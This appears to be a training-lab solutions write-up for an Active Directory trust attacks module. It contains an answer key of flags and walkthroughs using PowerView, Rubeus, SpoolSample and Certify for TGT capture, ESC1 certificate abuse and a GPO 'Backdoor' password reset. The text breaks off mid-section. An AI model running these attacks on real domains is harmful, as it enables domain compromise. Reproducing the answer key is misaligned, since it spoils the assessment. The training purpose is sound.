| Section | Question Number | Answer |
| --- | --- | --- |
| Enumerating Domain & Forest Trusts | Question 1 | Bidirectional |
| Enumerating Domain & Forest Trusts | Question 2 | Outbound |
| Mapping Active Directory Trusts | Question 1 | DONE |
| Unconstrained Delegation | Question 1 | dc130415baf0dd46e6e7fe3f3d3c5d93 |
| Abusing ADCS | Question 1 | 26b118e6f9441c27c7bd3789555709f0 |
| GPO On Site Attack | Question 1 | 6488d86a495073926f75e8d9be91e6bf |
| GoldenGMSA Attack | Question 1 | S-1-5-21-2879935145-656083549-3766571964-3103 |
| GoldenGMSA Attack | Question 2 | 95f6b2904700e00742c6349f5c0f95f9 |
| DNS Trust Attack | Question 1 | hunter |
| DNS Trust Attack | Question 2 | 191f30406af530c8a5ba9636c7eaf106 |
| Abusing Foreign Groups & ACL Principals | Question 1 | DEV\\htb-student |
| Abusing Foreign Groups & ACL Principals | Question 2 | 07a3bbe15f607be2aafa9724f808056e |
| Abusing Foreign Groups & ACL Principals | Question 3 | b4fcf05d5e35fed1f6a27afe53be2695 |
| ExtraSids Attack | Question 1 | 6e2fb9d60348eed39d7033f414ce0c7c |
| Attacking Cross Forest Trusts | Question 1 | killer |
| Trust Account Attack | Question 1 | letmein |
| Trust Account Attack | Question 2 | 4cf2108f7478900dfc0ea344890a0d05 |
| Unconstrained Delegation Cross Forest | Question 1 | 1d9700fece3d6a5d99e85642467bbc30 |
| SID History Injection Attack | Question 1 | HTB{S1d\_H1StoRy\_En@bl3D} |
| SID History Injection Attack | Question 2 | james |
| SID Filter Bypass (CVE-2020-0665) | Question 1 | HTB{CVE\_2020\_0665\_FTW} |
| Abusing SQL Server Links | Question 1 | HTB{SQL\_SERV3R\_ABUS3} |
| Abusing Foreign Security Principals & ACLs | Question 1 | HTB{FSP\_ABU53\_F0r\_FUN} |
| Abusing Foreign Security Principals & ACLs | Question 2 | HTB{FSP\_AC1s\_Ar3\_FuN} |
| Abusing PAM Trusts | Question 1 | HTB{P4M\_Trust\_Abuse} |
| Active Directory Trust Attacks - Skills Assessment | Question 1 | HTB{AD\_F0rest\_Trust} |
| Active Directory Trust Attacks - Skills Assessment | Question 2 | HTB{D1SABLE\_SID\_HISTORY} |
| Active Directory Trust Attacks - Skills Assessment | Question 3 | HTB{TRU5T\_ACCOUNT\_PWN} |
| Active Directory Trust Attacks - Skills Assessment | Question 4 | HTB{SHAD0W\_CREDENT1AL\_ATT4CK} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Enumerating Domain & Forest Trusts

## Question 1

### "What is the direction of trust from the Inlanefreight domain to the Logistics domain?"

After spawning the target machine students need to establish an RDP session using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:'HTB_@cademy_stdnt!' /dynamic-resolution
```

```
┌─[us-academy-3]─[10.10.14.174]─[htb-ac-8414@htb-ovr4md2zgt]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.204 /u:htb-student /p:'HTB_@cademy_stdnt!' /dynamic-resolution 

[06:31:57:692] [6231:6232] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[06:31:57:692] [6231:6232] [WARN][com.freerdp.crypto] - CN = SQL01.inlanefreight.ad
Certificate details for 10.129.229.204:3389 (RDP-Server):
	Common Name: SQL01.inlanefreight.ad
	Subject:     CN = SQL01.inlanefreight.ad
	Issuer:      CN = SQL01.inlanefreight.ad
	Thumbprint:  db:ad:9c:20:62:53:59:7e:71:f2:76:df:6d:59:cd:81:62:af:99:da:64:26:2c:01:79:13:fd:71:c4:66:9f:ea
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, students need to open `PowerShell`, navigate to `C:\Tools`, and import `PowerView.ps1`, and use the `Get-DomainTrust` to fetch the trust relationship between the domains. Students will find that the trust between the `Inlanefreight` and the `Logistics` domains is `Bidirectional`:

Code: powershell

```powershell
cd C:\Tools
Import-Module .\PowerView.ps1
Get-DomainTrust
```

```
PS C:\Users\htb-student> cd C:\Tools
PS C:\Tools> Import-Module .\PowerView
PS C:\Tools> Get-DomainTrust

SourceName      : inlanefreight.ad
TargetName      : logistics.ad
TrustType       : WINDOWS_ACTIVE_DIREC
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 12/26/2023 4:13:40 P
WhenChanged     : 3/12/2024 4:54:19 AM

<SNIP>
```

Answer: `Bidirectional`

# Enumerating Domain & Forest Trusts

## Question 2

### "What is the direction of trust from the Logistics domain to the Megacorp domain?"

Using the same RDP and `PowerShell` sessions from the previous question, students will have to utilize PowerView again with the `Get-DomainTrustMapping` cmdlet where they will find that the trust between the `Logistics` and `Megacorp` domains is `Outbound`.

Code: powershell

```powershell
Get-DomainTrustMapping
```

```
PS C:\Tools> Get-DomainTrustMapping

<SNIP>

SourceName      : logistics.ad
TargetName      : MEGACORP.AD
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 3/9/2024 11:08:15 AM
WhenChanged     : 4/25/2024 5:43:39 AM
```

Answer: `Outbound`

# Unconstrained Delegation

## Question 1

### "Abuse Unconstrained Delegation to get the TGT of DC01$ and submit the flag located at \\\\DC01\\UCD\_flag\\flag.txt."

After spawning the target machine students need to establish an RDP session using the credentials `Administrator:HTB_@cademy_adm!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution
```

```
┌─[us-academy-3]─[10.10.14.174]─[htb-ac-8414@htb-ovr4md2zgt]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.207 /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution 

[07:11:07:459] [7058:7059] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[07:11:07:459] [7058:7059] [WARN][com.freerdp.crypto] - CN = DC02.dev.INLANEFREIGHT.AD
[07:11:07:459] [7058:7059] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:11:07:459] [7058:7059] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[07:11:07:459] [7058:7059] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:11:07:459] [7058:7059] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.207:3389) 
[07:11:07:459] [7058:7059] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[07:11:07:459] [7058:7059] [ERROR][com.freerdp.crypto] - Common Name (CN):
[07:11:07:459] [7058:7059] [ERROR][com.freerdp.crypto] - 	DC02.dev.INLANEFREIGHT.AD
[07:11:07:459] [7058:7059] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.207:3389 (RDP-Server):
	Common Name: DC02.dev.INLANEFREIGHT.AD
	Subject:     CN = DC02.dev.INLANEFREIGHT.AD
	Issuer:      CN = DC02.dev.INLANEFREIGHT.AD
	Thumbprint:  61:6c:d0:4b:2a:33:ad:bd:4d:b9:b3:23:ee:f8:53:14:79:74:2a:72:cd:3f:8f:9f:fe:6c:59:d4:d6:c6:48:10
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, students need to open `PowerShell`, navigate to `C:\Tools`, and start `Rubeus` with the `monitor` command by specifying the `interval` to 5 seconds and disabling line wrapping with `/nowrap`:

Code: powershell

```powershell
cd C:\Tools
.\Rubeus.exe monitor /interval:5 /nowrap
```

```
PS C:\Users\Administrator> cd C:\Tools
PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs

<SNIP>
```

Students will have to open another `PowerShell` terminal and navigate to `C:\Tools` where they will utilize `SpoolSample.exe` to coerce an authentication from `DC01` to `DC02` using their fully qualified domain names:

Code: powershell

```powershell
cd C:\Tools
.\SpoolSample.exe dc01.inlanefreight.ad dc02.dev.inlanefreight.ad
```

```
PS C:\Users\Administrator> cd C:\Tools
PS C:\Tools> .\SpoolSample.exe dc01.inlanefreight.ad dc02.dev.inlanefreight.ad
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\dc01.inlanefreight.ad, CaptureServer: \\dc02.dev.inlanefreight.ad
Attempted printer notification and received an invalid handle. The coerced authentication probably worked!
```

In the initial `PowerShell` terminal students will see a base64 encoded ticket from the coerced authentication from `DC01$`:

```
PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs

<SNIP>

[*] 4/25/2024 6:15:26 AM UTC - Found new TGT:

  User                  :  DC01$@INLANEFREIGHT.AD
  StartTime             :  4/25/2024 1:08:10 AM
  EndTime               :  4/25/2024 11:08:10 AM
  RenewTill             :  5/2/2024 1:08:10 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFvDCCB<SNIP>FQuQUQ=
```

Right after, the ticket is captured students need to terminate `Rubeus` using the key combination of `CTRL + C`. They will have to reuse the ticket using `Rubeus` with the `renew` command to request a valid ticket-granting ticket (TGT) and import the ticket into memory:

Code: powershell

```powershell
.\Rubeus.exe renew /ticket:doIFvDCCB<SNIP>FQuQUQ= /ptt
```

```
PS C:\Tools> .\Rubeus.exe renew /ticket:doIFvDCCB<SNIP>FQuQUQ= /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Renew Ticket

[*] Using domain controller: DC01.INLANEFREIGHT.AD (172.16.210.99)
[*] Building TGS-REQ renewal for: 'INLANEFREIGHT.AD\DC01$'
[+] TGT renewal request successful!
[*] base64(ticket.kirbi):

      doIFvDCCBbigAwIBBaEDAgEWooIEuDCCBLRhggSwMIIErKADAgEFoRIbEElOTEFORUZSRUlHSFQuQUSi
JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEElOTEFORUZSRUlHSFQuQUSjggRoMIIEZKADAgESoQMCAQKiggRW
<SNIP>
AQKhHDAaGwZrcmJ0Z3QbEElOTEFORUZSRUlHSFQuQUQ=
[+] Ticket successfully imported!
```

With the imported ticket students can access resources on the `DC01` and get the flag using the `type` command and specifying the path `\\DC01\UCD_flag\flag.txt`:

Code: powershell

```powershell
type \\DC01\UCD_flag\flag.txt
```

```
PS C:\Tools> type \\DC01\UCD_flag\flag.txt
dc130415baf0dd46e6e7fe3f3d3c5d93
```

Answer: `dc130415baf0dd46e6e7fe3f3d3c5d93`

# Abusing ADCS

## Question 1

### "Perform the ADCS attack and request a certificate on behalf of "Tom". What is the flag value located at "\\\\DC01\\ADCS\_flag\\flag.txt"?"

After spawning the target machine students need to establish an RDP session using the credentials `Administrator:HTB_@cademy_adm!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution 
```

```
┌─[us-academy-3]─[10.10.14.174]─[htb-ac-8414@htb-ovr4md2zgt]─[~]
└──╼ [★]$ xfreerdp /v:10.129.228.9 /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution 

[07:53:13:519] [7903:7904] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[07:53:13:519] [7903:7904] [WARN][com.freerdp.crypto] - CN = DC02.dev.INLANEFREIGHT.AD
[07:53:13:520] [7903:7904] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:53:13:520] [7903:7904] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[07:53:13:520] [7903:7904] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:53:13:520] [7903:7904] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.228.9:3389) 
[07:53:13:520] [7903:7904] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[07:53:13:520] [7903:7904] [ERROR][com.freerdp.crypto] - Common Name (CN):
[07:53:13:520] [7903:7904] [ERROR][com.freerdp.crypto] - 	DC02.dev.INLANEFREIGHT.AD
[07:53:13:520] [7903:7904] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.228.9:3389 (RDP-Server):
	Common Name: DC02.dev.INLANEFREIGHT.AD
	Subject:     CN = DC02.dev.INLANEFREIGHT.AD
	Issuer:      CN = DC02.dev.INLANEFREIGHT.AD
	Thumbprint:  61:6c:d0:4b:2a:33:ad:bd:4d:b9:b3:23:ee:f8:53:14:79:74:2a:72:cd:3f:8f:9f:fe:6c:59:d4:d6:c6:48:10
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will have to open `PowerShell`, navigate to `C:\Tools`, and use `PsExec.exe` to spawn another `PowerShell` terminal as the `SYSTEM` user.

Code: powershell

```powershell
cd C:\Tools
.\PsExec.exe -accepteula -s -i powershell
```

```
PS C:\Users\Administrator> cd C:\Tools
PS C:\Tools> .\PsExec.exe -accepteula -s -i powershell

PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com
```

Subsequently, they need to utilize the newly spawned terminal to access `Microsoft Management Console` (`MMC`) to begin the misconfiguration of a template making it vulnerable to ESC1 attack.

Code: powershell

```powershell
mmc
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> mmc
```

Within the console, students need to proceed to add a snap-in through `File` -> `Add/Remove Snap-in...`:

![[HTB Solutions/CPTS/z. images/a38291a335523e5576868ed5353c0ff6_MD5.jpg]]

Using the `Add or Remove Snap-ins` window students need to select `Certificate Templates` and click on `Add >` and click on `OK` to add the snap-in:

![[HTB Solutions/CPTS/z. images/d8f402bfefe7653c119f841fb0922ca8_MD5.jpg]]

Subsequently, students need to utilize `Certificate Templates` from the tree view on the left and locate the `User` template, by right-clicking on the template they need to click on `Duplicate Template`:

![[HTB Solutions/CPTS/z. images/d800abbab3129214cd2911d2d2e52fa6_MD5.jpg]]

Students need to alter the properties of the duplicated template by going to `Subject Name` tab in the properties and selecting the `Supply in the request` option:

![[HTB Solutions/CPTS/z. images/4693d218c537e59c41130b312044e238_MD5.jpg]]

Subsequently, students need to go to the `Security` tab and add the `Administrator` user granting him `Full Control` over the template and saving configurational changes:

![[HTB Solutions/CPTS/z. images/31f63cc74b71e8a2b7fb0121a9122785_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/8ff9e6c3f7642b8928d6fb52392017f4_MD5.jpg]]

Students will have to use the previously spawned `PowerShell` terminal as `SYSTEM` to open the `Active Directory Service Interfaces` (`ADSI`):

Code: powershell

```powershell
adsiedit.msc
```

```
PS C:\Windows\system32> adsiedit.msc
```

Subsequently, they need to right-click on `ADSI Edit` in the newly spawned window and select `Connect to` option:

![[HTB Solutions/CPTS/z. images/e3813ec32c542eb2397bc060c7eb3939_MD5.jpg]]

From there on, students need to select the `Configuration` naming context in the `Select a well known Naming Context` option and click on `OK`:

![[HTB Solutions/CPTS/z. images/3d8f6d658c3584f1f0c13e7fd99c70e2_MD5.jpg]]

From there on, students need to navigate using the tree view to `CN=Public Key Services` starting from `Configuration [DC02.dev.INLANEFREIGHT.AD]` -> `CN=Configuration,DC=INLANEFREIGHT,DC=AD` ->`CN=Services` -> `CN=Public Key Services` where they need to right-click on `CN=Public Key Services` container and select `Properties`:

![[HTB Solutions/CPTS/z. images/4dd49ec0daf4e32015885fe4feda090c_MD5.jpg]]

Within the `Properties` window, students need to select the `Security` tab where they need to click on `Advanced`:

![[HTB Solutions/CPTS/z. images/629d591fd763c70336fe670f50b44019_MD5.jpg]]

Subsequently, students need to locate the `SYSTEM` principal in the `Advanced Security Settings for Public Key Services` and edit it by clicking on the `Edit` button:

![[HTB Solutions/CPTS/z. images/4cdd9fe2517242826e28cda97bd43523_MD5.jpg]]

From there, they need to alter the `Applies to:` setting from `This object only` to `This object and all descendant objects` and click `OK`:

![[HTB Solutions/CPTS/z. images/213a85c6242180877770a7c5bfd8e23e_MD5.jpg]]

Subsequently, students need to click on the `OK` button in the previous windows which will apply the updated permission in the container.

Right after, they need to expand the `CN=Public Key Services` and locate the `CN=Enrollement Services` container where students need to right-click on the `CN=INLANEFREIGHT-DC01-CA` and select `Properties`:

![[HTB Solutions/CPTS/z. images/d1342d8f13d614efbef85f2fe2d835f8_MD5.jpg]]

Within the attribute editor, students need to locate the `certificateTemplates` attribute and edit it:

![[HTB Solutions/CPTS/z. images/eebd4d700815239f9560c73a7eab6938_MD5.jpg]]

From there on, they need to submit the name of the duplicated template which is `Copy of User` in the `Value to add:` field, and click on `Add`, `Apply` and then on `OK` in the two tabs:

![[HTB Solutions/CPTS/z. images/5ef2d0e09dadc8edc14d7985b886c7cc_MD5.jpg]]

Subsequently, students need to spawn another `PowerShell` terminal, navigate to `C:\Tools`, and utilize `Certify.exe` to verify that the template has been properly misconfigured:

Code: powershell

```powershell
cd C:\Tools
.\Certify.exe find /vulnerable
```

```
PS C:\Users\Administrator> cd C:\Tools
PS C:\Tools> .\Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=INLANEFREIGHT,DC=AD'

[*] Listing info about the Enterprise CA 'INLANEFREIGHT-DC01-CA'

<SNIP>

[!] Vulnerable Certificates Templates :

    CA Name                               : DC01.INLANEFREIGHT.AD\INLANEFREIGHT-DC01-CA
    Template Name                         : Copy of User
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
 
<SNIP>

Certify completed in 00:00:03.2199836
```

Having verified that the template is present and configured for the `ESC1` attack, students will have to utilize `Certify.exe` to request a certificate on behalf of the user `Tom` and they will have to copy the contents of the certificate which are going to be used to create a `.pfx` file:

Code: powershell

```powershell
.\Certify.exe request /ca:inlanefreight.ad\INLANEFREIGHT-DC01-CA /domain:inlanefreight.ad /template:"Copy of User" /altname:INLANEFREIGHT\Tom
```

```
PS C:\Tools> .\Certify.exe request /ca:inlanefreight.ad\INLANEFREIGHT-DC01-CA /domain:inlanefreight.ad /template:"Copy of User" /altname:INLANEFREIGHT\Tom

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

<SNIP>
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAyLA79sQ/0x2X1nbWOtKEH9aOAmzfpYS4KEb/UH8lPeIhTH0J

<SNIP>

uLlgrOWkOtV5G2T+Pjg9rGTEXRGYCUEFFGCZD9wJHrTWW3wJp4/B
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGYTCCBUmgAwIBAgITJgAAAAhlu2batinaPgAAAAAACDANBgkqhkiG9w0BAQsF

<SNIP>

7YMd8/i1giYMFAJCZgu43kMExl3npR44BKUZk+JLZdZYFgdSAEm4iSbXVbsqmB62
lnIyD8U=
-----END CERTIFICATE-----

<SNIP>
```

Subsequently, students need to utilize the Linux workstation to save the contents of the certificate into `cert.pem` and use `openssl` to generate the `.pfx` file without a password:

Code: shell

```shell
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

```
┌─[us-academy-3]─[10.10.14.174]─[htb-ac-8414@htb-qbk5ekulce]─[~]
└──╼ [★]$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Enter Export Password:
Verifying - Enter Export Password:
```

They need to start a Python3 HTTP server on port 8000 which will be used to transfer the `cert.pfx` file to the target machine:

Code: shell

```shell
python3 -m http.server 8000
```

```
┌─[us-academy-3]─[10.10.14.174]─[htb-ac-8414@htb-qbk5ekulce]─[~]
└──╼ [★]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Students need to return to the RDP session and the `PowerShell` terminal which they will use to download the `cert.pfx` file.

Code: powershell

```powershell
iwr -uri http://PWNIP:8000/cert.pfx -o cert.pfx
```

```
PS C:\Tools> iwr -uri http://10.10.14.174:8000/cert.pfx -o cert.pfx
```

Subsequently, students need to use `Rubeus` to request a ticket-granting ticket (TGT) as the user Tom and import the ticket into memory:

Code: powershell

```powershell
.\Rubeus.exe asktgt /domain:inlanefreight.ad /user:Tom /certificate:cert.pfx /ptt
```

```
PS C:\Tools> .\Rubeus.exe asktgt /domain:inlanefreight.ad /user:Tom /certificate:cert.pfx /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Administrator, CN=Users, DC=dev, DC=INLANEFREIGHT, DC=AD
[*] Building AS-REQ (w/ PKINIT preauth) for: 'inlanefreight.ad\Tom'
[*] Using domain controller: 172.16.210.99:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGEDCCBgygAwIBBaEDAgEWooIFHjCCBRphggUWMIIFEqADAgEFoRIbEElOTEFORUZSRUlHSFQuQUSi

<SNIP>
      EElOTEFORUZSRUlHSFQuQUSpJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEGlubGFuZWZyZWlnaHQuYWQ=
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/inlanefreight.ad
  ServiceRealm             :  INLANEFREIGHT.AD
  UserName                 :  Tom
  UserRealm                :  INLANEFREIGHT.AD
  StartTime                :  4/25/2024 4:24:31 AM
  EndTime                  :  4/25/2024 2:24:31 PM
  RenewTill                :  5/2/2024 4:24:31 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  v5McXHPutULCodd8oWuYNQ==
  ASREP (key)              :  005F564194EB7BB0B4AE4C3D7C81147C
```

Right after, they have imported the ticket the flag can be obtained:

Code: powershell

```powershell
type \\DC01\ADCS_flag\flag.txt
```

```
PS C:\Tools> type \\DC01\ADCS_flag\flag.txt
26b118e6f9441c27c7bd3789555709f0
```

Answer: `26b118e6f9441c27c7bd3789555709f0`

# GPO On Site Attack

## Question 1

### "Perform a GPO on-site attack to reset the password of the user 'gpo\_admin' in the parent domain and submit the flag located at "\\\\DC01\\GPO\_flag\\flag.txt"."

After spawning the target machine students need to establish an RDP session using the credentials `Administrator:HTB_@cademy_adm!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution 
```

```
┌─[us-academy-3]─[10.10.14.174]─[htb-ac-8414@htb-1akrtch4ne]─[~]
└──╼ [★]$ xfreerdp /v:10.129.237.96 /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution 

[11:06:05:756] [4200:4201] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[11:06:05:756] [4200:4201] [WARN][com.freerdp.crypto] - CN = DC02.dev.INLANEFREIGHT.AD
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.237.96:3389) 
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - Common Name (CN):
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - 	DC02.dev.INLANEFREIGHT.AD
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.237.96:3389 (RDP-Server):
	Common Name: DC02.dev.INLANEFREIGHT.AD
	Subject:     CN = DC02.dev.INLANEFREIGHT.AD
	Issuer:      CN = DC02.dev.INLANEFREIGHT.AD
	Thumbprint:  61:6c:d0:4b:2a:33:ad:bd:4d:b9:b3:23:ee:f8:53:14:79:74:2a:72:cd:3f:8f:9f:fe:6c:59:d4:d6:c6:48:10
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students need to open `PowerShell` and add a new group policy object using `New-GPO` cmdlet.

Code: powershell

```powershell
$gpo = "Backdoor"
New-GPO $gpo
```

```
PS C:\Users\Administrator> $gpo = "Backdoor"
PS C:\Users\Administrator> New-GPO $gpo

DisplayName      : Backdoor
DomainName       : dev.INLANEFREIGHT.AD
Owner            : DEV\Domain Admins
Id               : 52b5ecd7-19d7-4c48-8463-8b8224a6bc5d
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 4/25/2024 5:10:18 AM
ModificationTime : 4/25/2024 5:10:18 AM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        :
```

Subsequently, students need to navigate to `C:\Tools`, and import `PowerView_2.ps1` to create a scheduled task that is going to change the password of the `gpo_admin`:

Code: powershell

```powershell
cd C:\Tools
Import-Module .\PowerView_2.ps1
New-GPOImmediateTask -Verbose -Force -TaskName 'Backdoor' -GPODisplayName "Backdoor" -Command C:\Windows\System32\cmd.exe -CommandArguments "/c net user gpo_admin Ac@demy123"
```

```
PS C:\Users\Administrator> cd C:\Tools
PS C:\Tools> Import-Module .\PowerView_2.ps1
PS C:\Tools> New-GPOImmediateTask -Verbose -Force -TaskName 'Backdoor' -GPODisplayName "Backdoor" -Command C:\Windows\System32\cmd.exe -CommandArguments "/c net user gpo_admin Ac@demy123"
VERBOSE: Get-DomainSearcher search string: LDAP://DC=dev,DC=INLANEFREIGHT,DC=AD
VERBOSE: Trying to weaponize GPO: {52B5ECD7-19D7-4C48-8463-8B8224A6BC5D}
```

Subsequently, students need to open the `Group Policy Management` and navigate to `Group Policy Objects` container using the tree view starting from `Forest: INLANEFREIGHT.AD` -> `Domains` -> `dev.INLANEFREIGHT.AD` -> `Group Policy Objects` where they will locate the `Backdoor` group policy object on which they need to right-click and select `Edit`:

![[HTB Solutions/CPTS/z. images/f454e002f004fb1a349ed36afbcbebd3_MD5.jpg]]

Within the `Group Policy Management Editor` they need to navigate to `Computer Configuration` -> `Preferences` -> `Control Panel Settings` -> `Scheduled Tasks` where they will locate the `Backdoor` task on which they need to right-click and select `Properties`:

![[HTB Solutions/CPTS/z. images/c61f05f8de916d2e4125d7f660f43b74_MD5.jpg]]

Within the `Properties` window students need to navigate to the `Settings` tab where they will alter the `If the task is already running, then following rule applies:` setting from `Do not start a new instance` to `Run a new instance in parallel` and click `Apply` and the `OK` buttons:

![[HTB Solutions/CPTS/z. images/328070291ca8d0a941f2d5e8f45a097f_MD5.jpg]]

Students will reuse the previously opened `PowerShell` terminal to retrieve the replication site of the root domain controller:

Code: powershell

```powershell
Get-ADDomainController -Server inlanefreight.ad | select ServerObjectDN
```

Code: powershell

```powershell
